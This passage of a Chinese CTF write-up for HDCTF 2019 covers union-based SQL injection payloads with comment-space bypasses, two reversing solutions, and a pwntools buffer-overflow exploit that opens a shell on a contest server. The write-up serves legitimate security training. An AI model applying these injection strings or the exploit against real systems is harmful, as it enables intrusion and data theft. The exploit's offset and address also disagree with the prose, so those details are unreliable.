这里我是这么理解sql语句的，由于不能使用等号，所以不能“where = ”语句一层一层查下来。所以利用information_schema，直接爆库中包含的所有表的表名，顺带爆出表所属的库，以为之后爆字段的时候用。（因为发现如果最后爆字段的时候不带上列所属的表及其所属库，他会自动引用其中sousou这个库，这并不是我们想要的）那为什么这样写可以呢，从information_schema.TABLES中缺能爆出库的信息？显然这是符合逻辑的，因可以理解列、表、库为从属关系，知道最末端的列，那么顺藤摸瓜般便可以知道其所属表，以及库；而只是知道最上层的库，显然不能得出一个具体的表。

同理然后爆出列名和表名（用来一一对应）

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t016d690ed0195302c0.png)

```
'/**/union/**/select/**/1,COLUMN_NAME,TABLE_NAME/**/from/**/information_schema.COLUMNS#
```

最后爆字段内容，即为flag

```
'/**/union/**/select/**/1,fffflllag__23333,3/**/from/**/ctf.flag#
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t011b3a6e3a6d9cebdc.png)

get flag： flag{wasaix_hndxctf2019}

如果这里不写ctf.flag，而只是写flag，便会报错：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t015be1aac0f189f455.png)

他默认引用了库sousou，然而表flag在库ctf中，所以会报错。

#### <a class="reference-link" name="%E6%80%BB%E7%BB%93%EF%BC%9A"></a>总结：

这一道sql除了考了常规的手工sql注入中union语句以外，还外加了一点点脑洞和密码的爆破，并没有特别难。但是sql这类题型在CTF赛事上几乎从不缺席。所以WEB方向的选手在sql这里是需要多下点功夫，去理解，去深入。



## REVERSE

没有认真学习汇编，甚至连动态调试都还不会的我，水了水本次比赛比较简单地两道逆向题，一道考简单算法，一道是pyc，刚好避开了我不会的东西，唔。。。

### <a class="reference-link" name="%E5%B0%B1%E6%98%AF%E7%AE%97%E6%B3%95%E9%80%86%E5%90%91%20100"></a>就是算法逆向 100

下载得到elf文件easyAlgorithm

放入IDA，进入main函数，F5来一下。

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax@12
  __int64 v4; // rdi@12
  int v5; // [sp+Ch] [bp-B4h]@1
  signed int i; // [sp+10h] [bp-B0h]@1
  signed int j; // [sp+14h] [bp-ACh]@4
  int v8; // [sp+20h] [bp-A0h]@1
  int v9; // [sp+24h] [bp-9Ch]@1
  int v10; // [sp+28h] [bp-98h]@1
  int v11; // [sp+2Ch] [bp-94h]@1
  int v12; // [sp+30h] [bp-90h]@1
  int v13; // [sp+34h] [bp-8Ch]@1
  int v14; // [sp+38h] [bp-88h]@1
  int v15; // [sp+3Ch] [bp-84h]@1
  int v16; // [sp+40h] [bp-80h]@1
  int v17; // [sp+44h] [bp-7Ch]@1
  int v18; // [sp+48h] [bp-78h]@1
  int v19; // [sp+4Ch] [bp-74h]@1
  int v20; // [sp+50h] [bp-70h]@1
  int v21; // [sp+54h] [bp-6Ch]@1
  int v22; // [sp+58h] [bp-68h]@1
  int v23; // [sp+5Ch] [bp-64h]@1
  int v24; // [sp+60h] [bp-60h]@1
  int v25; // [sp+64h] [bp-5Ch]@1
  int v26; // [sp+68h] [bp-58h]@1
  int v27; // [sp+6Ch] [bp-54h]@1
  int v28; // [sp+70h] [bp-50h]@1
  int v29; // [sp+74h] [bp-4Ch]@1
  int v30; // [sp+78h] [bp-48h]@1
  int v31; // [sp+7Ch] [bp-44h]@1
  int v32; // [sp+80h] [bp-40h]@1
  int v33; // [sp+84h] [bp-3Ch]@1
  int v34; // [sp+88h] [bp-38h]@1
  char v35[40]; // [sp+90h] [bp-30h]@1
  __int64 v36; // [sp+B8h] [bp-8h]@1

  v36 = *MK_FP(__FS__, 40LL);
  v5 = 0;
  v8 = 2;
  v9 = 10;
  v10 = 8;
  v11 = 8;
  v12 = 12;
  v13 = 6;
  v14 = 4;
  v15 = 10;
  v16 = 8;
  v17 = 16;
  v18 = 8;
  v19 = 6;
  v20 = 12;
  v21 = 6;
  v22 = 8;
  v23 = 0;
  v24 = 6;
  v25 = 12;
  v26 = 12;
  v27 = 16;
  v28 = 2;
  v29 = 8;
  v30 = 10;
  v31 = 12;
  v32 = 8;
  v33 = 4;
  v34 = 2;
  puts("Pls give me your flag:");
  __isoc99_scanf("%27s", v35);
  for ( i = 0; i &lt;= 26; ++i )
    *(&amp;v8 + i) -= i % 5;
  for ( j = 0; j &lt;= 26; ++j )
  {
    if ( (*(&amp;v8 + j) ^ v35[j]) != aDegbslvQsizobw[j] )
    {
      puts("Try again!");
      exit(0);
    }
    ++v5;
  }
  if ( v5 == 27 )
    puts("Coungratulations!");
  result = 0;
  v4 = *MK_FP(__FS__, 40LL) ^ v36;
  return result;
}
```

确实很简单，伪代码看下来，就是将给定的字符先按一定规则移位，然后分别和flag的各个字符异或，最后得到一个加密后的字符串。点开aDegbslvQsizobw[j]可以看到加密后的字符串为：degbsLv{qSiZObwyZKekmua}li|

那么构造脚本进行解密。大致思路为：先将给定的字符按一定规则移位，然后将其与加密后的字符串按位异或，python脚本如下：

```
a=[2,10,8,8,12,6,4,10,8,16,8,6,12,6,8,0,6,12,12,16,2,8,10,12,8,4,2]
enc='degbsLv{qSiZObwyZKekmua}li|'
ans=''
for i in range(27):
    a[i]=a[i]-i%5
for i in range(27):
    ans+=chr(a[i]^ord(enc[i]))
print ans
```

得到flag：flag{Just_a_Easy_Algorithm}

#### <a class="reference-link" name="%E6%80%BB%E7%BB%93%EF%BC%9A"></a>总结：

这一题考的是简单的移位和异或加密，这里的移位并不需要去逆，而异或运算的逆，这里有一个点，就是a^b=c，那么c^b=a，加密是可逆的。

这一题更倾向于一种引导作用，让新手去接触逆向，去体会、明白这个“逆”字含义。

easypyc 200

题目描述：就是pyc逆向

下载得到pyc文件，有在线反编译的网站：[https://tool.lu/pyc/](https://tool.lu/pyc/)

反编译得到python代码：

```
import marshal
from binascii import unhexlify
exec(marshal.loads(unhexlify(b'faa7696d706f7274206d61727368616c0a66726f6d2062696e617363696920696d706f727420756e6865786c6966790a66726f6d2062617365363420696d706f7274206236346465636f64650a7072696e742822446f20796f75206b6e6f77207079633f22290a61203d20223d51324e314d444e32516d4e6d56444e32556d4e78596a5a314d6a4e3563444d3359574e35637a4d33456a4e31596a5933636a4e78597a5932596a4e22')))
```

见到unhexlify，大致猜测就是反十六进制？那就将其中的十六进制转换为字符串，得到又一串python代码

```
import marshal
from binascii import unhexlify
from base64 import b64decode
print("Do you know pyc?")
a = "=Q2N1MDN2QmNmVDN2UmNxYjZ1MjN5cDM3YWN5czM3EjN1YjY3cjNxYzY2YjN"
```

见到一串类似base64编码后的字符串，但是等于号在前面，猜测大概是逆序了，那就将其逆序后base64解码，然后十六进制转化为字符串，最后得到flag：flag{easy_pyc_and_md5}



## PWN

### <a class="reference-link" name="babystack%20150"></a>babystack 150

下载文件，放入IDA分析，F5来一下：

[![](https://p1.ssl.qhimg.com/t01f8320b14420146ef.png)](https://p1.ssl.qhimg.com/t01f8320b14420146ef.png)

注意到这里有一个name的读入，然后进入vuln（）函数：

[![](https://p2.ssl.qhimg.com/t0151b52d511c92820f.png)](https://p2.ssl.qhimg.com/t0151b52d511c92820f.png)

注意到这里有一个size的输入，于是想到负数溢出。只要输入size的时候填入一个负数，那么就可以输入任意长的字符串。那要填多少的个字符呢？点进buf查看栈的情况，

[![](https://p1.ssl.qhimg.com/t01859c9ddad607353e.png)](https://p1.ssl.qhimg.com/t01859c9ddad607353e.png)

[![](https://p2.ssl.qhimg.com/t018dd16a71472992de.png)](https://p2.ssl.qhimg.com/t018dd16a71472992de.png)

buf和ebp差了5c，而填充ebp又需要4个字节，所以填充需要填充60，也就是十进制的96，而ebp之后是要覆盖的eip，eip覆盖成啥呢，在IDA的左侧发现了hint函数

[![](https://p3.ssl.qhimg.com/t013851eb24abb9e191.png)](https://p3.ssl.qhimg.com/t013851eb24abb9e191.png)

call _system的地址为0804864E，于是就将eip覆盖成0804864E，

[![](https://p1.ssl.qhimg.com/t010a011ddf09073908.png)](https://p1.ssl.qhimg.com/t010a011ddf09073908.png)

又注意到command这个参数紧跟hint函数，而command这个参数怎么传呢，想到最开始我们输入了name，于是可以在eip后面跟一个name的地址，而name则构造成/bin/sh，

于是构造脚本：

```
from pwn import *
context.log_level = 'debug'
p=remote('123.207.114.39',8889)
#p = process('./babystack')
p.recvuntill(':')
p.sendline('/bin/sh')
p.recvuntill('&gt;')
p.sendline('1')
p.recvuntill(':')
p.sendline('-1')
p.recvuntill('string')
p.sendline('a'*93+p32(0x08048636))
p.interactive()
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01bb8d6fb6214a1f9e.png)

get flag：flag{bb01b3f2-96cB-47ad-8768-188dcf34fbf5}

总结：本题也是新手向的一道pwn题，可以引导新手了解pwn最基础而核心的原理：利用各种漏洞达到溢出从而执行自己所期望的shell命令来获取flag。当然，更多的其他的pwn题远比这一道babystack要来的复杂以及有深度，所以，慢慢学吖！



## 结语：

这就是我本次参与第一届HDCTF所做出来的所有的题，每道题的WP已经写的尽可能详细，希望对刚入门CTF的CTFer有所帮助。
